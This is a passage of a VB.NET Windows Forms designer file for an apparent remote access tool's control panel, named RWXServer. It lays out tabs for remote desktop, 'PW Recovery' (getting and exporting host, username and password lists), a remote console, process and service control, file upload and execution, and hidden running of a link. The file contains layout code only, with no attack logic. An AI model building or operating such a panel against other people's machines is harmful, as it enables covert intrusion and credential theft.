<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class x
    Inherits System.Windows.Forms.Form

    'Das Formular überschreibt den Löschvorgang, um die Komponentenliste zu bereinigen.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Wird vom Windows Form-Designer benötigt.
    Private components As System.ComponentModel.IContainer

    'Hinweis: Die folgende Prozedur ist für den Windows Form-Designer erforderlich.
    'Das Bearbeiten ist mit dem Windows Form-Designer möglich.  
    'Das Bearbeiten mit dem Code-Editor ist nicht möglich.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(x))
        Me.SaveFileDialog1 = New System.Windows.Forms.SaveFileDialog()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.KillProcessToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.ContextMenuStrip2 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.SuspendServiceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageList2 = New System.Windows.Forms.ImageList(Me.components)
        Me.ContextMenuStrip3 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.UploadFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DownloadFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExecuteFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameFileFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteFileFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TabControlClass1 = New RWXServer.TabControlClass()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.chkmouse = New System.Windows.Forms.CheckBox()
        Me.cmdRDPoff = New System.Windows.Forms.Button()
        Me.cmdRDPon = New System.Windows.Forms.Button()
        Me.cmdquali = New System.Windows.Forms.Button()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.cmbQuali = New System.Windows.Forms.ComboBox()
        Me.picRDP = New System.Windows.Forms.PictureBox()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.cmdgetPW = New System.Windows.Forms.Button()
        Me.cmdExportPW = New System.Windows.Forms.Button()
        Me.lstPWs = New System.Windows.Forms.ListView()
        Me.Host = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Username = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Password = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.cmdgetProcess = New System.Windows.Forms.Button()
        Me.lstProc = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage9 = New System.Windows.Forms.TabPage()
        Me.cmdGetService = New System.Windows.Forms.Button()
        Me.lstService = New System.Windows.Forms.ListView()
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.cmdGetSoftware = New System.Windows.Forms.Button()
        Me.lstSoftware = New System.Windows.Forms.ListView()
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.cmdStopCMD = New System.Windows.Forms.Button()
        Me.cmdStartCMD = New System.Windows.Forms.Button()
        Me.txtCommand = New System.Windows.Forms.TextBox()
        Me.txtConsole = New System.Windows.Forms.TextBox()
        Me.TabPage7 = New System.Windows.Forms.TabPage()
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage8 = New System.Windows.Forms.TabPage()
        Me.cmdStartFile = New System.Windows.Forms.Button()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.txtPreview = New System.Windows.Forms.TextBox()
        Me.picPreview = New System.Windows.Forms.PictureBox()
        Me.txtFolder = New System.Windows.Forms.TextBox()
        Me.lstContent = New System.Windows.Forms.ListView()
        Me.Name1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Size = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.cmdStopFile = New System.Windows.Forms.Button()
        Me.lstDrives = New System.Windows.Forms.ListView()
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.cmdmsgboxSend = New System.Windows.Forms.Button()
        Me.txtmsgboxText = New System.Windows.Forms.TextBox()
        Me.txtmsgboxTitle = New System.Windows.Forms.TextBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.btnrun = New System.Windows.Forms.Button()
        Me.chkrhidden = New System.Windows.Forms.CheckBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.txtlink = New System.Windows.Forms.TextBox()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.ContextMenuStrip2.SuspendLayout()
        Me.ContextMenuStrip3.SuspendLayout()
        Me.TabControlClass1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        CType(Me.picRDP, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.TabPage9.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        Me.TabPage7.SuspendLayout()
        Me.TabControl1.SuspendLayout()
        Me.TabPage8.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox1.SuspendLayout()
        CType(Me.picPreview, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage6.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.SuspendLayout()
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.KillProcessToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(134, 26)
        '
        'KillProcessToolStripMenuItem
        '
        Me.KillProcessToolStripMenuItem.Image = CType(resources.GetObject("KillProcessToolStripMenuItem.Image"), System.Drawing.Image)
        Me.KillProcessToolStripMenuItem.Name = "KillProcessToolStripMenuItem"
        Me.KillProcessToolStripMenuItem.Size = New System.Drawing.Size(133, 22)
        Me.KillProcessToolStripMenuItem.Text = "Kill Process"
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "0")
        Me.ImageList1.Images.SetKeyName(1, "1")
        Me.ImageList1.Images.SetKeyName(2, "2")
        Me.ImageList1.Images.SetKeyName(3, "3")
        '
        'ContextMenuStrip2
        '
        Me.ContextMenuStrip2.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem1, Me.SuspendServiceToolStripMenuItem})
        Me.ContextMenuStrip2.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip2.Size = New System.Drawing.Size(139, 48)
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Image = CType(resources.GetObject("ToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(138, 22)
        Me.ToolStripMenuItem1.Text = "Start Service"
        '
        'SuspendServiceToolStripMenuItem
        '
        Me.SuspendServiceToolStripMenuItem.Image = CType(resources.GetObject("SuspendServiceToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SuspendServiceToolStripMenuItem.Name = "SuspendServiceToolStripMenuItem"
        Me.SuspendServiceToolStripMenuItem.Size = New System.Drawing.Size(138, 22)
        Me.SuspendServiceToolStripMenuItem.Text = "Stop Service"
        '
        'ImageList2
        '
        Me.ImageList2.ImageStream = CType(resources.GetObject("ImageList2.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList2.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList2.Images.SetKeyName(0, "0")
        Me.ImageList2.Images.SetKeyName(1, "1")
        Me.ImageList2.Images.SetKeyName(2, "2")
        Me.ImageList2.Images.SetKeyName(3, "3")
        Me.ImageList2.Images.SetKeyName(4, "4")
        Me.ImageList2.Images.SetKeyName(5, "5")
        Me.ImageList2.Images.SetKeyName(6, "6")
        Me.ImageList2.Images.SetKeyName(7, "7")
        Me.ImageList2.Images.SetKeyName(8, "8")
        Me.ImageList2.Images.SetKeyName(9, "9")
        Me.ImageList2.Images.SetKeyName(10, "10")
        Me.ImageList2.Images.SetKeyName(11, "11")
        Me.ImageList2.Images.SetKeyName(12, "12")
        '
        'ContextMenuStrip3
        '
        Me.ContextMenuStrip3.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UploadFileToolStripMenuItem, Me.DownloadFileToolStripMenuItem, Me.ExecuteFileToolStripMenuItem, Me.RenameFileFolderToolStripMenuItem, Me.DeleteFileFolderToolStripMenuItem})
        Me.ContextMenuStrip3.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip3.Size = New System.Drawing.Size(177, 114)
        '
        'UploadFileToolStripMenuItem
        '
        Me.UploadFileToolStripMenuItem.Enabled = False
        Me.UploadFileToolStripMenuItem.Image = CType(resources.GetObject("UploadFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UploadFileToolStripMenuItem.Name = "UploadFileToolStripMenuItem"
        Me.UploadFileToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.UploadFileToolStripMenuItem.Text = "Upload File"
        '
        'DownloadFileToolStripMenuItem
        '
        Me.DownloadFileToolStripMenuItem.Enabled = False
        Me.DownloadFileToolStripMenuItem.Image = CType(resources.GetObject("DownloadFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DownloadFileToolStripMenuItem.Name = "DownloadFileToolStripMenuItem"
        Me.DownloadFileToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.DownloadFileToolStripMenuItem.Text = "Download File"
        '
        'ExecuteFileToolStripMenuItem
        '
        Me.ExecuteFileToolStripMenuItem.Image = CType(resources.GetObject("ExecuteFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ExecuteFileToolStripMenuItem.Name = "ExecuteFileToolStripMenuItem"
        Me.ExecuteFileToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.ExecuteFileToolStripMenuItem.Text = "Execute File"
        '
        'RenameFileFolderToolStripMenuItem
        '
        Me.RenameFileFolderToolStripMenuItem.Image = CType(resources.GetObject("RenameFileFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RenameFileFolderToolStripMenuItem.Name = "RenameFileFolderToolStripMenuItem"
        Me.RenameFileFolderToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.RenameFileFolderToolStripMenuItem.Text = "Rename File/Folder"
        '
        'DeleteFileFolderToolStripMenuItem
        '
        Me.DeleteFileFolderToolStripMenuItem.Image = CType(resources.GetObject("DeleteFileFolderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DeleteFileFolderToolStripMenuItem.Name = "DeleteFileFolderToolStripMenuItem"
        Me.DeleteFileFolderToolStripMenuItem.Size = New System.Drawing.Size(176, 22)
        Me.DeleteFileFolderToolStripMenuItem.Text = "Delete File/Folder"
        '
        'TabControlClass1
        '
        Me.TabControlClass1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.TabControlClass1.Controls.Add(Me.TabPage1)
        Me.TabControlClass1.Controls.Add(Me.TabPage2)
        Me.TabControlClass1.Controls.Add(Me.TabPage3)
        Me.TabControlClass1.Controls.Add(Me.TabPage9)
        Me.TabControlClass1.Controls.Add(Me.TabPage4)
        Me.TabControlClass1.Controls.Add(Me.TabPage5)
        Me.TabControlClass1.Controls.Add(Me.TabPage7)
        Me.TabControlClass1.Controls.Add(Me.TabPage6)
        Me.TabControlClass1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControlClass1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.TabControlClass1.ItemSize = New System.Drawing.Size(25, 120)
        Me.TabControlClass1.Location = New System.Drawing.Point(0, 0)
        Me.TabControlClass1.Multiline = True
        Me.TabControlClass1.Name = "TabControlClass1"
        Me.TabControlClass1.SelectedIndex = 0
        Me.TabControlClass1.ShowOuterBorders = False
        Me.TabControlClass1.Size = New System.Drawing.Size(844, 396)
        Me.TabControlClass1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.TabControlClass1.SquareColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.TabControlClass1.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.White
        Me.TabPage1.Controls.Add(Me.chkmouse)
        Me.TabPage1.Controls.Add(Me.cmdRDPoff)
        Me.TabPage1.Controls.Add(Me.cmdRDPon)
        Me.TabPage1.Controls.Add(Me.cmdquali)
        Me.TabPage1.Controls.Add(Me.Label1)
        Me.TabPage1.Controls.Add(Me.cmbQuali)
        Me.TabPage1.Controls.Add(Me.picRDP)
        Me.TabPage1.Location = New System.Drawing.Point(124, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(716, 388)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Remote Desktop"
        '
        'chkmouse
        '
        Me.chkmouse.AutoSize = True
        Me.chkmouse.Location = New System.Drawing.Point(168, 7)
        Me.chkmouse.Name = "chkmouse"
        Me.chkmouse.Size = New System.Drawing.Size(94, 17)
        Me.chkmouse.TabIndex = 6
        Me.chkmouse.Text = "Control Mouse"
        Me.chkmouse.UseVisualStyleBackColor = True
        '
        'cmdRDPoff
        '
        Me.cmdRDPoff.Enabled = False
        Me.cmdRDPoff.Location = New System.Drawing.Point(87, 4)
        Me.cmdRDPoff.Name = "cmdRDPoff"
        Me.cmdRDPoff.Size = New System.Drawing.Size(75, 23)
        Me.cmdRDPoff.TabIndex = 5
        Me.cmdRDPoff.Text = "Stop"
        Me.cmdRDPoff.UseVisualStyleBackColor = True
        '
        'cmdRDPon
        '
        Me.cmdRDPon.Location = New System.Drawing.Point(6, 4)
        Me.cmdRDPon.Name = "cmdRDPon"
        Me.cmdRDPon.Size = New System.Drawing.Size(75, 23)
        Me.cmdRDPon.TabIndex = 4
        Me.cmdRDPon.Text = "Start"
        Me.cmdRDPon.UseVisualStyleBackColor = True
        '
        'cmdquali
        '
        Me.cmdquali.Location = New System.Drawing.Point(583, 4)
        Me.cmdquali.Name = "cmdquali"
        Me.cmdquali.Size = New System.Drawing.Size(75, 23)
        Me.cmdquali.TabIndex = 3
        Me.cmdquali.Text = "Change"
        Me.cmdquali.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(496, 9)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(42, 13)
        Me.Label1.TabIndex = 2
        Me.Label1.Text = "Quality:"
        '
        'cmbQuali
        '
        Me.cmbQuali.FormattingEnabled = True
        Me.cmbQuali.Items.AddRange(New Object() {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10"})
        Me.cmbQuali.Location = New System.Drawing.Point(544, 5)
        Me.cmbQuali.Name = "cmbQuali"
        Me.cmbQuali.Size = New System.Drawing.Size(33, 21)
        Me.cmbQuali.TabIndex = 1
        Me.cmbQuali.Text = "5"
        '
        'picRDP
        '
        Me.picRDP.Location = New System.Drawing.Point(3, 35)
        Me.picRDP.Name = "picRDP"
        Me.picRDP.Size = New System.Drawing.Size(710, 350)
        Me.picRDP.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.picRDP.TabIndex = 0
        Me.picRDP.TabStop = False
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.cmdgetPW)
        Me.TabPage2.Controls.Add(Me.cmdExportPW)
        Me.TabPage2.Controls.Add(Me.lstPWs)
        Me.TabPage2.Location = New System.Drawing.Point(124, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(716, 388)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "PW Recovery"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'cmdgetPW
        '
        Me.cmdgetPW.Location = New System.Drawing.Point(6, 8)
        Me.cmdgetPW.Name = "cmdgetPW"
        Me.cmdgetPW.Size = New System.Drawing.Size(395, 23)
        Me.cmdgetPW.TabIndex = 3
        Me.cmdgetPW.Text = "Get Passwords"
        Me.cmdgetPW.UseVisualStyleBackColor = True
        '
        'cmdExportPW
        '
        Me.cmdExportPW.Location = New System.Drawing.Point(6, 359)
        Me.cmdExportPW.Name = "cmdExportPW"
        Me.cmdExportPW.Size = New System.Drawing.Size(395, 23)
        Me.cmdExportPW.TabIndex = 2
        Me.cmdExportPW.Text = "Export Passwords"
        Me.cmdExportPW.UseVisualStyleBackColor = True
        '
        'lstPWs
        '
        Me.lstPWs.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Host, Me.Username, Me.Password})
        Me.lstPWs.FullRowSelect = True
        Me.lstPWs.Location = New System.Drawing.Point(6, 37)
        Me.lstPWs.Name = "lstPWs"
        Me.lstPWs.Size = New System.Drawing.Size(395, 316)
        Me.lstPWs.TabIndex = 1
        Me.lstPWs.UseCompatibleStateImageBehavior = False
        Me.lstPWs.View = System.Windows.Forms.View.Details
        '
        'Host
        '
        Me.Host.Text = "Host"
        Me.Host.Width = 120
        '
        'Username
        '
        Me.Username.Text = "Username"
        Me.Username.Width = 80
        '
        'Password
        '
        Me.Password.Text = "Password"
        Me.Password.Width = 120
        '
        'TabPage3
        '
        Me.TabPage3.Controls.Add(Me.cmdgetProcess)
        Me.TabPage3.Controls.Add(Me.lstProc)
        Me.TabPage3.Location = New System.Drawing.Point(124, 4)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(716, 388)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Process Manager"
        Me.TabPage3.UseVisualStyleBackColor = True
        '
        'cmdgetProcess
        '
        Me.cmdgetProcess.Location = New System.Drawing.Point(6, 8)
        Me.cmdgetProcess.Name = "cmdgetProcess"
        Me.cmdgetProcess.Size = New System.Drawing.Size(414, 23)
        Me.cmdgetProcess.TabIndex = 4
        Me.cmdgetProcess.Text = "Get Processlist"
        Me.cmdgetProcess.UseVisualStyleBackColor = True
        '
        'lstProc
        '
        Me.lstProc.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader4})
        Me.lstProc.ContextMenuStrip = Me.ContextMenuStrip1
        Me.lstProc.FullRowSelect = True
        Me.lstProc.Location = New System.Drawing.Point(6, 37)
        Me.lstProc.MultiSelect = False
        Me.lstProc.Name = "lstProc"
        Me.lstProc.Size = New System.Drawing.Size(414, 345)
        Me.lstProc.SmallImageList = Me.ImageList1
        Me.lstProc.TabIndex = 0
        Me.lstProc.UseCompatibleStateImageBehavior = False
        Me.lstProc.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Processname"
        Me.ColumnHeader1.Width = 97
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "PID"
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Path"
        Me.ColumnHeader4.Width = 155
        '
        'TabPage9
        '
        Me.TabPage9.Controls.Add(Me.cmdGetService)
        Me.TabPage9.Controls.Add(Me.lstService)
        Me.TabPage9.Location = New System.Drawing.Point(124, 4)
        Me.TabPage9.Name = "TabPage9"
        Me.TabPage9.Size = New System.Drawing.Size(716, 388)
        Me.TabPage9.TabIndex = 8
        Me.TabPage9.Text = "Service Manager"
        Me.TabPage9.UseVisualStyleBackColor = True
        '
        'cmdGetService
        '
        Me.cmdGetService.Location = New System.Drawing.Point(6, 8)
        Me.cmdGetService.Name = "cmdGetService"
        Me.cmdGetService.Size = New System.Drawing.Size(414, 23)
        Me.cmdGetService.TabIndex = 6
        Me.cmdGetService.Text = "Get Services"
        Me.cmdGetService.UseVisualStyleBackColor = True
        '
        'lstService
        '
        Me.lstService.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader3, Me.ColumnHeader5, Me.ColumnHeader6})
        Me.lstService.ContextMenuStrip = Me.ContextMenuStrip2
        Me.lstService.FullRowSelect = True
        Me.lstService.Location = New System.Drawing.Point(6, 37)
        Me.lstService.MultiSelect = False
        Me.lstService.Name = "lstService"
        Me.lstService.Size = New System.Drawing.Size(414, 345)
        Me.lstService.SmallImageList = Me.ImageList1
        Me.lstService.TabIndex = 5
        Me.lstService.UseCompatibleStateImageBehavior = False
        Me.lstService.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Servicename"
        Me.ColumnHeader3.Width = 180
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "Internal name"
        Me.ColumnHeader5.Width = 116
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "Status"
        '
        'TabPage4
        '
        Me.TabPage4.Controls.Add(Me.cmdGetSoftware)
        Me.TabPage4.Controls.Add(Me.lstSoftware)
        Me.TabPage4.Location = New System.Drawing.Point(124, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Size = New System.Drawing.Size(716, 388)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Installed Software"
        Me.TabPage4.UseVisualStyleBackColor = True
        '
        'cmdGetSoftware
        '
        Me.cmdGetSoftware.Location = New System.Drawing.Point(6, 8)
        Me.cmdGetSoftware.Name = "cmdGetSoftware"
        Me.cmdGetSoftware.Size = New System.Drawing.Size(414, 23)
        Me.cmdGetSoftware.TabIndex = 8
        Me.cmdGetSoftware.Text = "Get Software"
        Me.cmdGetSoftware.UseVisualStyleBackColor = True
        '
        'lstSoftware
        '
        Me.lstSoftware.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader9})
        Me.lstSoftware.FullRowSelect = True
        Me.lstSoftware.Location = New System.Drawing.Point(6, 37)
        Me.lstSoftware.MultiSelect = False
        Me.lstSoftware.Name = "lstSoftware"
        Me.lstSoftware.Size = New System.Drawing.Size(414, 345)
        Me.lstSoftware.SmallImageList = Me.ImageList1
        Me.lstSoftware.TabIndex = 7
        Me.lstSoftware.UseCompatibleStateImageBehavior = False
        Me.lstSoftware.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "Softwarename"
        Me.ColumnHeader9.Width = 312
        '
        'TabPage5
        '
        Me.TabPage5.Controls.Add(Me.cmdStopCMD)
        Me.TabPage5.Controls.Add(Me.cmdStartCMD)
        Me.TabPage5.Controls.Add(Me.txtCommand)
        Me.TabPage5.Controls.Add(Me.txtConsole)
        Me.TabPage5.Location = New System.Drawing.Point(124, 4)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Size = New System.Drawing.Size(716, 388)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "Remote Console"
        Me.TabPage5.UseVisualStyleBackColor = True
        '
        'cmdStopCMD
        '
        Me.cmdStopCMD.Enabled = False
        Me.cmdStopCMD.Location = New System.Drawing.Point(319, 8)
        Me.cmdStopCMD.Name = "cmdStopCMD"
        Me.cmdStopCMD.Size = New System.Drawing.Size(165, 23)
        Me.cmdStopCMD.TabIndex = 3
        Me.cmdStopCMD.Text = "Stop Session"
        Me.cmdStopCMD.UseVisualStyleBackColor = True
        '
        'cmdStartCMD
        '
        Me.cmdStartCMD.Location = New System.Drawing.Point(5, 8)
        Me.cmdStartCMD.Name = "cmdStartCMD"
        Me.cmdStartCMD.Size = New System.Drawing.Size(165, 23)
        Me.cmdStartCMD.TabIndex = 2
        Me.cmdStartCMD.Text = "Start Session"
        Me.cmdStartCMD.UseVisualStyleBackColor = True
        '
        'txtCommand
        '
        Me.txtCommand.Location = New System.Drawing.Point(5, 350)
        Me.txtCommand.Name = "txtCommand"
        Me.txtCommand.Size = New System.Drawing.Size(479, 20)
        Me.txtCommand.TabIndex = 1
        '
        'txtConsole
        '
        Me.txtConsole.BackColor = System.Drawing.SystemColors.Window
        Me.txtConsole.Location = New System.Drawing.Point(5, 38)
        Me.txtConsole.Multiline = True
        Me.txtConsole.Name = "txtConsole"
        Me.txtConsole.ReadOnly = True
        Me.txtConsole.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.txtConsole.Size = New System.Drawing.Size(479, 306)
        Me.txtConsole.TabIndex = 0
        '
        'TabPage7
        '
        Me.TabPage7.Controls.Add(Me.TabControl1)
        Me.TabPage7.Location = New System.Drawing.Point(124, 4)
        Me.TabPage7.Name = "TabPage7"
        Me.TabPage7.Size = New System.Drawing.Size(716, 388)
        Me.TabPage7.TabIndex = 6
        Me.TabPage7.Text = "File Manager"
        Me.TabPage7.UseVisualStyleBackColor = True
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage8)
        Me.TabControl1.Location = New System.Drawing.Point(3, 3)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(705, 382)
        Me.TabControl1.TabIndex = 11
        '
        'TabPage8
        '
        Me.TabPage8.Controls.Add(Me.cmdStartFile)
        Me.TabPage8.Controls.Add(Me.PictureBox1)
        Me.TabPage8.Controls.Add(Me.GroupBox1)
        Me.TabPage8.Controls.Add(Me.txtFolder)
        Me.TabPage8.Controls.Add(Me.lstContent)
        Me.TabPage8.Controls.Add(Me.cmdStopFile)
        Me.TabPage8.Controls.Add(Me.lstDrives)
        Me.TabPage8.Location = New System.Drawing.Point(4, 22)
        Me.TabPage8.Name = "TabPage8"
        Me.TabPage8.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage8.Size = New System.Drawing.Size(697, 356)
        Me.TabPage8.TabIndex = 0
        Me.TabPage8.Text = "File Manager"
        Me.TabPage8.UseVisualStyleBackColor = True
        '
        'cmdStartFile
        '
        Me.cmdStartFile.Location = New System.Drawing.Point(6, 6)
        Me.cmdStartFile.Name = "cmdStartFile"
        Me.cmdStartFile.Size = New System.Drawing.Size(111, 23)
        Me.cmdStartFile.TabIndex = 7
        Me.cmdStartFile.Text = "Start Fileserver"
        Me.cmdStartFile.UseVisualStyleBackColor = True
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(259, 10)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox1.TabIndex = 10
        Me.PictureBox1.TabStop = False
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.txtPreview)
        Me.GroupBox1.Controls.Add(Me.picPreview)
        Me.GroupBox1.Location = New System.Drawing.Point(123, 235)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(433, 115)
        Me.GroupBox1.TabIndex = 5
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Preview"
        '
        'txtPreview
        '
        Me.txtPreview.Location = New System.Drawing.Point(112, 19)
        Me.txtPreview.Multiline = True
        Me.txtPreview.Name = "txtPreview"
        Me.txtPreview.ReadOnly = True
        Me.txtPreview.Size = New System.Drawing.Size(306, 90)
        Me.txtPreview.TabIndex = 1
        '
        'picPreview
        '
        Me.picPreview.Location = New System.Drawing.Point(6, 19)
        Me.picPreview.Name = "picPreview"
        Me.picPreview.Size = New System.Drawing.Size(100, 90)
        Me.picPreview.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.picPreview.TabIndex = 0
        Me.picPreview.TabStop = False
        '
        'txtFolder
        '
        Me.txtFolder.Location = New System.Drawing.Point(280, 9)
        Me.txtFolder.Name = "txtFolder"
